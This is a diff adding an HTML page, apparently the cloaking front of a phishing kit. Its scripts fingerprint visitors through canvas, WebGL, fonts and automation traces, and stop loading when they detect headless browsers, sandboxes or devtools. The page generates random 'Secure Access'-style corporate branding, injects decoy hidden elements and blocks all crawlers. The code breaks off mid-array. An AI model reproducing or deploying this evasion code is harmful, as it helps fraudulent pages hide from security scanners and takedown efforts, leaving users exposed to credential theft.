@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+    <script>
+        (function(w,d,n){
+            var _rnd=Math.random,_flr=Math.floor,_rn=function(x){return _flr(_rnd()*x)};
+            
+            w._vE=function(){
+                var s=0;
+                try{if(typeof process!=='undefined'&&process.versions)s+=5;}catch(e){}
+                try{if(n.webdriver||w.callPhantom||w.__nightmare)s+=5;}catch(e){}
+                try{if(n.userAgent&&(n.userAgent.indexOf('jsdom')>-1||n.userAgent.indexOf('Headless')>-1))s+=5;}catch(e){}
+                try{if(!w.chrome&&!w.safari&&n.vendor==='')s+=3;}catch(e){}
+                try{if(w.outerWidth===0||w.outerHeight===0)s+=3;}catch(e){}
+                try{if(w.innerWidth===0||w.innerHeight===0)s+=3;}catch(e){}
+                try{var t=Function.prototype.toString;if(t.call(t).indexOf('native code')===-1)s+=3;}catch(e){}
+                try{if(typeof module!=='undefined'&&module.exports)s+=4;}catch(e){}
+                return s;
+            };
+            
+            w._vG=function(){
+                if(w._vOK===true)return false;
+                if(w._vFail===true)return true;
+                var score=w._vE();
+                if(score>=8){
+                    w._vFail=true;
+                    return true;
+                }
+                w._vOK=true;
+                return false;
+            };
+            
+            if(w._vG())return;
+            
+        })(window,document,navigator);
+        
+        if(window._vG&&window._vG()){}else{
+        var _$=[],_$$=Math.random,_$$$=function(n){return Math.floor(_$$()*n)},
+            _0=window,_1=document,_2=navigator,_3='',_4=null,_5=!0,_6=!1,
+            _7=Object,_8=Array,_9=String,_a=Function,_b=Date,_c=Math,
+            _enc=function(s){return btoa(encodeURIComponent(s))},
+            _dec=function(s){try{return decodeURIComponent(atob(s))}catch(e){return s}},
+            _h=function(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return h>>>0},
+            _ts=function(){return _b.now()||+new _b()},
+            _rid=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<(l||16);i++)s+=c[_$$$(62)];return s},
+            _rh=function(){return'#'+_$$$(16777215).toString(16).padStart(6,'0')};
+        
+        (function(){
+            var _entropy=[];
+            _entropy.push(_ts());
+            _entropy.push(_2.hardwareConcurrency||0);
+            _entropy.push(_0.devicePixelRatio||1);
+            _entropy.push(_0.screen?_0.screen.colorDepth:0);
+            _entropy.push(_2.maxTouchPoints||0);
+            _entropy.push(new _b().getTimezoneOffset());
+            _entropy.push(_2.language||'');
+            _entropy.push(_0.innerWidth*_0.innerHeight);
+            _0._entropy=_h(_entropy.join('|'));
+        })();
+        
+        (function(_w,_d,_n){
+            var _isSandbox=!1,_isAnalysis=!1,_sandboxScore=0;
+            
+            try{
+                if(_w.self!==_w.top){
+                    try{_w.top.location.href;}catch(e){_sandboxScore+=1;}
+                }
+            }catch(e){_sandboxScore+=1;}
+            
+            try{
+                var _origEval=_w.eval;
+                var _evalTest=_origEval('1+1');
+                if(_evalTest!==2)_sandboxScore+=2;
+            }catch(e){_sandboxScore+=1;}
+            
+            var _fnToStr=_a.prototype.toString;
+            try{
+                var _testFn=function(){return 1};
+                var _str=_fnToStr.call(_testFn);
+                if(_str.indexOf('return 1')===-1&&_str.indexOf('native code')===-1)_sandboxScore+=2;
+            }catch(e){_sandboxScore+=1;}
+            
+            var _debugStart=_ts();
+            (function(){})();
+            var _debugEnd=_ts();
+            if(_debugEnd-_debugStart>100)_sandboxScore+=3;
+            
+            if(typeof process!=='undefined'&&process.versions&&process.versions.node)_sandboxScore+=5;
+            if(typeof module!=='undefined'&&module.exports)_sandboxScore+=3;
+            if(typeof require==='function'&&typeof require.resolve==='function')_sandboxScore+=3;
+            
+            if(_n.userAgent&&_n.userAgent.indexOf('jsdom')>-1)_sandboxScore+=5;
+            if(_w.navigator&&_w.navigator.userAgent&&_w.navigator.userAgent.indexOf('Node.js')>-1)_sandboxScore+=5;
+            if(!_w.chrome&&!_w.safari&&!_w.opera&&_n.vendor==='')_sandboxScore+=2;
+            
+            var _browserGlobals=['localStorage','sessionStorage','indexedDB','caches','crypto'];
+            var _missingCount=0;
+            for(var i=0;i<_browserGlobals.length;i++){
+                try{if(typeof _w[_browserGlobals[i]]==='undefined')_missingCount++;}catch(e){_missingCount++;}
+            }
+            if(_missingCount>=3)_sandboxScore+=3;
+            
+            var _t1=_b.now(),_t2=performance.now();
+            setTimeout(function(){
+                var _t3=_b.now(),_t4=performance.now();
+                if(_t3-_t1<5||_t4-_t2<5)_w._timingAnomaly=!0;
+            },10);
+            
+            if(_w.innerWidth===0||_w.innerHeight===0)_sandboxScore+=2;
+            if(_w.outerWidth===0||_w.outerHeight===0)_sandboxScore+=2;
+            if(_w.screen&&(_w.screen.width===0||_w.screen.height===0))_sandboxScore+=3;
+            
+            try{
+                throw new Error('_');
+            }catch(e){
+                var _stack=e.stack||'';
+                if(_stack.indexOf('puppeteer')>-1||_stack.indexOf('playwright')>-1||
+                   _stack.indexOf('selenium')>-1||_stack.indexOf('webdriver')>-1)_sandboxScore+=5;
+            }
+            
+            try{
+                var _consoleStr=_9(console.log);
+                if(_consoleStr.indexOf('native code')===-1&&_consoleStr.indexOf('function')>-1)_sandboxScore+=2;
+            }catch(e){}
+            
+            var _perfMarks=[];
+            for(var i=0;i<5;i++){
+                var _s=performance.now();
+                for(var j=0;j<1000;j++){Math.random();}
+                _perfMarks.push(performance.now()-_s);
+            }
+            var _avgPerf=_perfMarks.reduce(function(a,b){return a+b},0)/_perfMarks.length;
+            if(_avgPerf<0.001||_avgPerf>50)_sandboxScore+=2;
+            
+            if(typeof WorkerGlobalScope!=='undefined'&&_w instanceof WorkerGlobalScope)_sandboxScore+=3;
+            
+            try{
+                var _wStr=_7.prototype.toString.call(_w);
+                var _dStr=_7.prototype.toString.call(_d);
+                if(_wStr.indexOf('Proxy')>-1||_dStr.indexOf('Proxy')>-1)_sandboxScore+=3;
+            }catch(e){}
+            
+            try{
+                if(_w.self!==_w.top){
+                    var _canScript=!0;
+                    try{_w.eval('1');}catch(e){_canScript=!1;_sandboxScore+=2;}
+                }
+            }catch(e){}
+            
+            _w._sandboxScore=_sandboxScore;
+            _w._isSandboxed=_sandboxScore>=5;
+            
+            _w._initApp=function(){return'Application initialized'};
+            _w._loadConfig=function(){return{version:'1.0.0',env:'production'}};
+            _w._handleError=function(e){return!1};
+            _w._validateInput=function(v){return typeof v==='string'&&v.length>0};
+            _w._formatDate=function(d){return new _b(d).toISOString()};
+            _w._debounce=function(f,w){var t;return function(){clearTimeout(t);t=setTimeout(f,w)}};
+            _w._throttle=function(f,l){var t=0;return function(){var n=_b.now();if(n-t>=l){t=n;f.apply(this,arguments)}}};
+            
+            if(_w.performance&&_w.performance.mark){
+                try{
+                    _w.performance.mark('app-init-start');
+                    setTimeout(function(){
+                        _w.performance.mark('app-init-end');
+                        _w.performance.measure('app-init','app-init-start','app-init-end');
+                    },100);
+                }catch(e){}
+            }
+            
+            try{
+                var _appReady=new CustomEvent('app:ready',{detail:{timestamp:_ts()}});
+                var _appLoaded=new CustomEvent('app:loaded',{detail:{status:'success'}});
+                setTimeout(function(){_d.dispatchEvent(_appReady)},50);
+                setTimeout(function(){_d.dispatchEvent(_appLoaded)},150);
+            }catch(e){}
+            
+        })(_0,_1,_2);
+        
+        (function(_w,_d,_n){
+            var _f=_6,_t=_5,_bc=[],_s=0;
+            
+            var _p1=['webdriver','__nightmare','callPhantom','_phantom','phantom','Buffer','emit','spawn',
+                'domAutomation','domAutomationController','_Selenium_IDE_Recorder','_selenium','calledSelenium',
+                '$cdc_','$wdc_','__driver_evaluate','__webdriver_evaluate','__selenium_evaluate','__fxdriver_evaluate',
+                '__driver_unwrapped','__webdriver_unwrapped','__selenium_unwrapped','__fxdriver_unwrapped',
+                '__webdriver_script_fn','__webdriver_script_func','_webdriver_script_fn','_webdriver_script_func',
+                '__lastWatirAlert','__lastWatirConfirm','__lastWatirPrompt','_WEBDRIVER_ELEM_CACHE',
+                'ChromeDriverw','driver-hierarchical','driver-evaluate','selenium-hierarchical',
+                '__webdriver_script_function','__webdriver_unwrapped','__selenium_unwrapped','__fxdriver_unwrapped',
+                'cdc_adoQpoasnfa76pfcZLmcfl_Array','cdc_adoQpoasnfa76pfcZLmcfl_Promise','cdc_adoQpoasnfa76pfcZLmcfl_Symbol'];
+            for(var i=0;i<_p1.length;i++){try{if(_w[_p1[i]]||_d[_p1[i]])_s+=3;}catch(e){}}
+            
+            try{
+                var _navProps=['webdriver','plugins','languages','platform','userAgent','vendor'];
+                for(var i=0;i<_navProps.length;i++){
+                    var desc=_7.getOwnPropertyDescriptor(_n.__proto__||_7.getPrototypeOf(_n),_navProps[i]);
+                    if(desc&&desc.get){
+                        var str=desc.get.toString();
+                        if(str.indexOf('[native code]')===-1)_s+=5;
+                    }
+                }
+            }catch(e){}
+            
+            var _ua=_n.userAgent||_3;
+            var _uaPatterns=[/HeadlessChrome/i,/PhantomJS/i,/Selenium/i,/puppeteer/i,/playwright/i,
+                /WebDriver/i,/Zombie/i,/Nightmare/i,/SlimerJS/i,/HtmlUnit/i,/Cypress/i,/TestCafe/i,
+                /Scrapy/i,/curl/i,/wget/i,/python-requests/i,/node-fetch/i,/axios/i,/HttpClient/i,
+                /Java\//i,/Apache-HttpClient/i,/Go-http-client/i,/libwww-perl/i,/MSIE 6\.0/i];
+            for(var i=0;i<_uaPatterns.length;i++){if(_uaPatterns[i].test(_ua))_s+=10;}
+            
+            var _fp={
+                plugins:_n.plugins?_n.plugins.length:0,
+                mimeTypes:_n.mimeTypes?_n.mimeTypes.length:0,
+                languages:_n.languages?_n.languages.length:0,
+                cookieEnabled:_n.cookieEnabled,
+                doNotTrack:_n.doNotTrack,
+                hardwareConcurrency:_n.hardwareConcurrency||0,
+                deviceMemory:_n.deviceMemory||0,
+                maxTouchPoints:_n.maxTouchPoints||0
+            };
+            if(_fp.plugins===0&&_ua.indexOf('Chrome')>-1)_s+=2;
+            if(_fp.mimeTypes===0&&_ua.indexOf('Chrome')>-1)_s+=2;
+            if(_fp.languages===0)_s+=2;
+            if(_fp.hardwareConcurrency===0)_s+=1;
+            
+            try{
+                var canvas=_d.createElement('canvas');
+                var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+                if(gl){
+                    var debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+                    if(debugInfo){
+                        var vendor=gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        var renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        if(/SwiftShader|LLVMpipe|VirtualBox|VMware/i.test(renderer))_s+=3;
+                        if(!vendor||!renderer)_s+=2;
+                    }else _s+=1;
+                }else _s+=3;
+            }catch(e){_s+=2}
+            
+            try{
+                var canvas=_d.createElement('canvas');
+                canvas.width=200;canvas.height=50;
+                var ctx=canvas.getContext('2d');
+                ctx.textBaseline='top';
+                ctx.font='14px Arial';
+                ctx.fillStyle='#f60';
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle='#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz',2,15);
+                ctx.fillStyle='rgba(102,204,0,0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz',4,17);
+                var dataUrl=canvas.toDataURL();
+                if(dataUrl.length<3000)_s+=2;
+                _w._canvasHash=_h(dataUrl);
+            }catch(e){_s+=3}
+            
+            try{
+                var AudioContext=_w.AudioContext||_w.webkitAudioContext;
+                if(!AudioContext)_s+=2;
+                if(AudioContext){
+                    var testCtx=new AudioContext();
+                    if(!testCtx.audioWorklet)_s+=1;
+                    testCtx.close().catch(function(){});
+                }
+            }catch(e){_s+=1}
+            
+            try{
+                var baseFonts=['monospace','sans-serif','serif'];
+                var testString='mmmmmmmmmmlli';
+                var testSize='72px';
+                var h=_d.getElementsByTagName('body')[0];
+                if(h){
+                    var s=_d.createElement('span');
+                    s.style.fontSize=testSize;
+                    s.innerHTML=testString;
+                    var defaultWidth={};
+                    var defaultHeight={};
+                    for(var i=0;i<baseFonts.length;i++){
+                        s.style.fontFamily=baseFonts[i];
+                        h.appendChild(s);
+                        defaultWidth[baseFonts[i]]=s.offsetWidth;
+                        defaultHeight[baseFonts[i]]=s.offsetHeight;
+                        h.removeChild(s);
+                    }
+                    var fontsToTest=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS'];
+                    var detectedFonts=0;
+                    for(var i=0;i<fontsToTest.length;i++){
+                        for(var j=0;j<baseFonts.length;j++){
+                            s.style.fontFamily=fontsToTest[i]+','+baseFonts[j];
+                            h.appendChild(s);
+                            if(s.offsetWidth!==defaultWidth[baseFonts[j]]||s.offsetHeight!==defaultHeight[baseFonts[j]])detectedFonts++;
+                            h.removeChild(s);
+                        }
+                    }
+                    if(detectedFonts<3)_s+=2;
+                }
+            }catch(e){}
+            
+            var _perf=_w.performance;
+            if(_perf){
+                if(_perf.timing){
+                    var _lt=_perf.timing.loadEventEnd-_perf.timing.navigationStart;
+                    if(_lt===0||_lt<0)_s+=2;
+                }
+                if(_perf.now){
+                    var t1=_perf.now();
+                    for(var i=0;i<1000;i++)Math.sqrt(i);
+                    var t2=_perf.now();
+                    if(t2-t1<0.001)_s+=3;
+                }
+            }
+            
+            if(_w.outerWidth===0||_w.outerHeight===0)_s+=3;
+            if(_w.screen&&(_w.screen.width===0||_w.screen.height===0))_s+=3;
+            if(_w.innerWidth===0||_w.innerHeight===0)_s+=3;
+            if(_w.screen&&_w.screen.availWidth===0)_s+=2;
+            if(_w.screenX===0&&_w.screenY===0&&_w.outerWidth===_w.screen.availWidth)_s+=1;
+            
+            if(_w.chrome){
+                if(!_w.chrome.runtime)_s+=2;
+                if(_w.chrome.runtime&&!_w.chrome.runtime.id)_s+=1;
+                if(!_w.chrome.loadTimes&&!_w.chrome.csi)_s+=1;
+            }else if(_ua.indexOf('Chrome')>-1)_s+=3;
+            
+            if(_n.permissions){
+                _n.permissions.query({name:'notifications'}).then(function(r){
+                    if(typeof Notification!=='undefined'&&Notification.permission==='denied'&&r.state==='prompt')_s+=5;
+                }).catch(function(){});
+            }
+            
+            var _devtools=_6;
+            if(_w.outerWidth-_w.innerWidth>160||_w.outerHeight-_w.innerHeight>160)_devtools=_t;
+            var element=new Image();
+            _7.defineProperty(element,'id',{get:function(){_devtools=_t;}});
+            if(_devtools)_s+=2;
+            
+            try{
+                var _test=_7.getOwnPropertyDescriptor(_n.__proto__,'webdriver');
+                if(_test&&_test.get&&_test.get.toString().indexOf('native code')===-1)_s+=5;
+            }catch(e){}
+            
+            try{
+                throw new Error();
+            }catch(e){
+                if(e.stack){
+                    var stackPatterns=['puppeteer','selenium','webdriver','playwright','cypress','testcafe','nightmare'];
+                    for(var i=0;i<stackPatterns.length;i++){
+                        if(e.stack.toLowerCase().indexOf(stackPatterns[i])>-1)_s+=10;
+                    }
+                }
+            }
+            
+            try{
+                var nativeToString=_a.prototype.toString;
+                if(nativeToString.call(nativeToString).indexOf('[native code]')===-1)_s+=5;
+            }catch(e){}
+            
+            try{
+                if(_w.Proxy){
+                    var handler={get:function(t,p){return t[p]}};
+                    var proxy=new Proxy({},handler);
+                    if(proxy.toString().indexOf('Proxy')>-1)_s+=2;
+                }
+            }catch(e){}
+            
+            try{
+                if(_w.self!==_w.top)_bc.push('iframe');
+                if(_w.frameElement)_bc.push('framed');
+            }catch(e){}
+            
+            if(!('ontouchstart' in _w)&&!('onmousemove' in _d)&&_n.maxTouchPoints===0)_s+=1;
+            
+            if(_n.getBattery){
+                _n.getBattery().then(function(b){
+                    if(b.charging&&b.chargingTime===0&&b.dischargingTime===Infinity&&b.level===1)_s+=1;
+                }).catch(function(){});
+            }
+            
+            if(_n.connection){
+                var conn=_n.connection;
+                if(conn.rtt===0&&conn.downlink===0)_s+=2;
+            }
+            
+            try{
+                if(_n.keyboard&&_n.keyboard.getLayoutMap){
+                    _n.keyboard.getLayoutMap().then(function(m){
+                        if(m.size===0)_s+=1;
+                    }).catch(function(){});
+                }
+            }catch(e){}
+            
+            if(_n.mediaDevices&&_n.mediaDevices.enumerateDevices){
+                _n.mediaDevices.enumerateDevices().then(function(d){
+                    if(d.length===0)_s+=2;
+                }).catch(function(){});
+            }
+            
+            if(_w.speechSynthesis){
+                var voices=_w.speechSynthesis.getVoices();
+                if(voices.length===0){
+                    _w.speechSynthesis.onvoiceschanged=function(){
+                        if(_w.speechSynthesis.getVoices().length===0)_s+=1;
+                    };
+                }
+            }
+            
+            _w._behaviorScore=0;
+            _w._mouseEvents=0;
+            _w._keyEvents=0;
+            _d.addEventListener('mousemove',function(){_w._mouseEvents++;},_6);
+            _d.addEventListener('keydown',function(){_w._keyEvents++;},_6);
+            
+            var _totalScore=_s+(_w._sandboxScore||0);
+            
+            _w['_'+_9.fromCharCode(104)+_9.fromCharCode(99)]=_totalScore>=10;
+            _w._botScore=_s;
+            _w._totalSecurityScore=_totalScore;
+            
+            if(_w['_hc']){
+                _w.stop();
+                return;
+            }
+        })(_0,_1,_2);
+        } 
+    </script>
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="duckduckbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="yandex" content="noindex, nofollow, noarchive, nosnippet">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="referrer" content="no-referrer">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <script>
+        if(window._vG&&window._vG()){}else{(function(){
+            if(window['_hc'])return;
+            
+            var _r=function(a){return a[_$$$(a.length)]};
+            var _id=function(l){var s='',c='abcdefghijklmnopqrstuvwxyz';for(var i=0;i<(l||8);i++)s+=c[_$$$(26)];return s};
+            var _idMixed=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-';for(var i=0;i<(l||12);i++)s+=c[_$$$(64)];return s};
+            var _rHex=function(l){var s='',c='0123456789abcdef';for(var i=0;i<(l||8);i++)s+=c[_$$$(16)];return s};
+            var _rHash=function(){return _rHex(8)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(12)};
+            var _rSemver=function(){return _$$$(5)+'.'+_$$$(20)+'.'+_$$$(100)};
+            
+            var prefixes=['','Global ','International ','Advanced ','Modern ','Next ','New ','First ','Prime ','Elite '];
+            var brands=['Secure','Cloud','Digital','Smart','Prime','Core','Net','Web','Data','Tech','Pro','One','Hub','Link','Base',
+                'Apex','Nova','Quantum','Vertex','Nexus','Pulse','Sync','Flow','Stream','Wave','Spark','Bolt','Swift','Rapid','Turbo'];
+            var suffixes=['Services','Platform','Systems','Solutions','Connect','Portal','Gateway','Access','Suite','Center',
+                'Network','Technologies','Labs','Works','Logic','Dynamics','Intelligence','Analytics','Security','Infrastructure'];
+            var formats=[
+                function(p,b,s){return p+b+s},
+                function(p,b,s){return p+b+' '+s},
+                function(p,b,s){return b+s},
+                function(p,b,s){return b+' '+s}
+            ];
+            window._brand=_r(formats)(_r(prefixes),_r(brands),_r(suffixes)).trim();
+            
+            var titleFormats=[
+                function(b){return b},
+                function(b){return b+' | Secure Access'},
+                function(b){return 'Welcome | '+b},
+                function(b){return b+' Portal'},
+                function(b){return b+' Cloud'}
+            ];
+            document.title=_r(titleFormats)(window._brand);
+            
+            var taglineWords=['security','connectivity','infrastructure','cloud services','data management','networking','solutions','technology'];
+            var taglineTemplates=['Enterprise-grade {0} for modern applications','Secure {0} for your digital needs','Next-generation {0} platform'];
+            window._tagline=_r(taglineTemplates).replace('{0}',_r(taglineWords));
+            
+            var metas=[
+                {name:'description',content:window._tagline},
+                {name:'author',content:window._brand},
+                {name:'generator',content:_r(['Webpack','Vite','Next.js','Gatsby','Nuxt','SvelteKit','Astro'])},
+                {property:'og:title',content:window._brand},
+                {property:'og:description',content:window._tagline},
+                {property:'og:type',content:'website'},
+                {name:'twitter:card',content:'summary'},
+                {name:'twitter:title',content:window._brand},
+                {name:'application-name',content:window._brand},
+                {name:'theme-color',content:['#1a73e8','#4285f4','#5f6368','#202124','#1967d2','#0d47a1'][_$$$(6)]}
+            ];
+            for(var i=0;i<metas.length;i++){
+                if(_$$()*100>20){
+                    var m=document.createElement('meta');
+                    for(var k in metas[i])m.setAttribute(k,metas[i][k]);
+                    document.head.appendChild(m);
+                }
+            }
+            
+            if(_$$()*100>50){
+                var jsonLd=document.createElement('script');
+                jsonLd.type='application/ld+json';
+                jsonLd.textContent=JSON.stringify({
+                    '@context':'https://schema.org',
+                    '@type':_r(['WebApplication','SoftwareApplication','WebSite','Organization']),
+                    'name':window._brand,
+                    'description':window._tagline,
+                    'applicationCategory':_r(['SecurityApplication','BusinessApplication','UtilitiesApplication']),
+                    'operatingSystem':'Any'
+                });
+                document.head.appendChild(jsonLd);
+            }
+            
+            var preloads=['dns-prefetch','preconnect'];
+            var domains=['https://cdn.jsdelivr.net','https://unpkg.com','https://cdnjs.cloudflare.com','https://api.github.com'];
+            for(var i=0;i<2+_$$$(3);i++){
+                var link=document.createElement('link');
+                link.rel=_r(preloads);
+                link.href=_r(domains);
+                if(link.rel==='preconnect')link.crossOrigin='anonymous';
+                document.head.appendChild(link);
+            }
+            
+            var root=document.documentElement;
+            root.style.setProperty('--'+_id(8),_$$$(360)+'deg');
+            root.style.setProperty('--'+_id(8),_$$$(100)+'%');
+            root.style.setProperty('--'+_id(8),(_$$$(20)+10)+'px');
+            
+            root.setAttribute('data-app-version',_rSemver());
+            root.setAttribute('data-app-env',_r(['production','prod','live']));
+            root.setAttribute('data-app-ready','true');
+            root.setAttribute('data-'+_id(6),_rHex(12));
+            
+            window._ids={
+                c:_id(10+_$$$(6)),l:_id(6+_$$$(6)),t:_id(8+_$$$(6)),
+                s:_id(7+_$$$(6)),p:_id(9+_$$$(6)),w:_id(5+_$$$(6)),
+                m:_idMixed(12+_$$$(8)),x:_idMixed(10+_$$$(8))
+            };
+        })();}
+    </script>
+    <style>
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        
+        .loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        if(window._vG&&window._vG()){}else{(function(){
+            if(window['_hc'])return;
+            
+            var _r=function(a){return a[_$$$(a.length)]};
+            var _id=function(l){var s='',c='abcdefghijklmnopqrstuvwxyz';for(var i=0;i<(l||8);i++)s+=c[_$$$(26)];return s};
+            var _idMixed=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-';for(var i=0;i<(l||12);i++)s+=c[_$$$(64)];return s};
+            var _rHex=function(l){var s='',c='0123456789abcdef';for(var i=0;i<(l||8);i++)s+=c[_$$$(16)];return s};
+            var _rHash=function(){return _rHex(8)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(12)};
+            var _rSemver=function(){return _$$$(5)+'.'+_$$$(20)+'.'+_$$$(100)};
+            var _rPath=function(){
+                var dirs=['src','lib','dist','build','assets','components','modules','utils','core','app'];
+                var files=['index','main','app','bundle','chunk','vendor','runtime','polyfill','common'];
+                var exts=['js','ts','jsx','tsx','mjs'];
+                return _r(dirs)+'/'+_r(files)+'.'+_r(exts);
+            };
+            
+            var invisibleStyles=[
+                'position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;margin:-1px;overflow:hidden;border:0;padding:0',
+                'position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden',
+                'opacity:0;pointer-events:none;position:absolute;z-index:-1;transform:scale(0)',
+                'visibility:hidden;position:absolute;width:0;height:0;overflow:hidden',
+                'display:block;position:absolute;left:-9999em;top:auto;width:1px;height:1px;overflow:hidden',
+                'position:absolute;white-space:nowrap;width:1px;height:1px;overflow:hidden;border:0;padding:0;clip:rect(0,0,0,0);clip-path:inset(50%)',
+                'transform:translateX(-100vw);position:fixed;opacity:0'
+            ];
+            
+            var container=document.createElement('div');
+            container.style.cssText=_r(invisibleStyles);
+            container.setAttribute('aria-hidden','true');
+            container.setAttribute('id',_id(12));
+            container.setAttribute('class',_idMixed(16));
+            container.setAttribute('data-'+_id(6),_rHex(12));
+            
+            var commentGenerators=[
+                function(){return '<!-- webpack:'+_r(['bootstrap','jsonp','require','chunk'])+' -->'},
+                function(){return '<!-- '+_r(['harmony','esm','cjs','amd'])+':'+_r(['export','import','default'])+' -->'},
+                function(){return '<!-- module:'+_rPath()+' -->'},
+                function(){return '<!-- chunk:'+_$$$(100)+' -->'},
+                function(){return '<!-- vite-ignore -->'},
+                function(){return '<!-- pure -->'},
+                function(){return '<!-- react-'+_r(['root','app','mount','portal'])+' -->'},
+                function(){return '<!-- vue-'+_r(['component','slot','teleport'])+'-'+_rHex(6)+' -->'},
+                function(){return '<!-- ng-'+_r(['view','content','container'])+' -->'},
+                function(){return '<!-- '+_r(['terser','uglify','babel','swc','esbuild'])+':'+_r(['minified','optimized'])+' -->'},
+                function(){return '<!-- sourcemap:'+_rHex(16)+'.map -->'},
+                function(){return '<!-- '+_rHash()+' -->'},
+                function(){return '<!-- hydration-'+_r(['boundary','marker','root'])+'-'+_rHex(6)+' -->'},
+                function(){return '<!-- ssr-'+_r(['content','placeholder','fallback'])+' -->'}
+            ];
+            
+            var componentGenerators=[
+                function(){
+                    var inputTypes=['text','email','tel','search','url','hidden'];
+                    return '<input type="'+_r(inputTypes)+'" name="'+_id(8)+'" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="'+_r(invisibleStyles)+'">';
+                },
+                function(){
+                    return '<a href="#'+_id(8)+'" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'" tabindex="-1">'+_r(['Skip to content','Skip navigation'])+'</a>';
+                },
+                function(){
+                    return '<div role="'+_r(['status','alert','log'])+'" aria-live="'+_r(['polite','assertive','off'])+'" aria-atomic="true" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<div id="'+_r(['portal','modal','tooltip','popover'])+'-'+_id(6)+'" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<svg xmlns="http://www.w3.org/2000/svg" style="'+_r(invisibleStyles)+'"><defs><symbol id="'+_id(8)+'"><path d="M0 0"/></symbol></defs></svg>';
+                },
+                function(){
+                    return '<template id="'+_id(10)+'" data-'+_id(6)+'="'+_idMixed(8)+'"><div class="'+_id(8)+'"></div></template>';
+                },
+                function(){
+                    return '<script type="application/json" id="'+_r(['__INITIAL_STATE__','__PRELOADED_STATE__','__APP_DATA__'])+'" data-'+_id(4)+'="'+_rHex(8)+'">{"v":'+_$$$(100)+'}<\/script>';
+                },
+                function(){
+                    return '<style id="'+_id(8)+'" data-'+_r(['emotion','styled','jss','css'])+'-'+_rHex(6)+'">/*'+_rHex(16)+'*/</style>';
+                },
+                function(){
+                    return '<div data-'+_r(['reactroot','vueapp','ngapp','sveltekit'])+' data-'+_id(6)+'="'+_rHex(12)+'" id="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<span id="'+_id(8)+'" class="'+_id(10)+'" aria-hidden="true" style="'+_r(invisibleStyles)+'"></span>';
+                },
+                function(){
+                    return '<canvas id="'+_id(8)+'" width="0" height="0" style="'+_r(invisibleStyles)+'" aria-hidden="true"></canvas>';
+                },
+                function(){
+                    return '<progress id="'+_id(8)+'" value="0" max="100" style="'+_r(invisibleStyles)+'" aria-hidden="true"></progress>';
+                }
+            ];
+            
+            var html='';
+            
+            var commentCount=5+_$$$(8);
+            for(var i=0;i<commentCount;i++){
+                html+=_r(commentGenerators)();
+            }
+            
+            var componentCount=8+_$$$(13);
+            for(var i=0;i<componentCount;i++){
+                html+=_r(componentGenerators)();
+                if(_$$()*100>60){
+                    html+=_r(commentGenerators)();
+                }
+            }
+            
+            var noscriptContent=[
+                '<meta http-equiv="refresh" content="0;url=?nojs=1">',
+                '<div class="'+_id(10)+'" style="padding:20px;text-align:center"><p>Please enable JavaScript to continue</p></div>'
+            ];
+            html+='<noscript>'+_r(noscriptContent)+'</noscript>';
+            
+            for(var i=0;i<2+_$$$(4);i++){
+                html+=_r(commentGenerators)();
+            }
+            
+            container.innerHTML=html;
+            document.body.appendChild(container);
+            
+            var bodyAttrs=[
+                ['data-'+_r(['page','route','view','screen']),_id(12)],
+                ['data-'+_r(['theme','mode','scheme']),_r(['light','dark','auto','system'])],
+                ['data-'+_r(['version','v','ver']),_rSemver()],
+                ['data-'+_r(['env','environment']),_r(['production','prod','live'])],
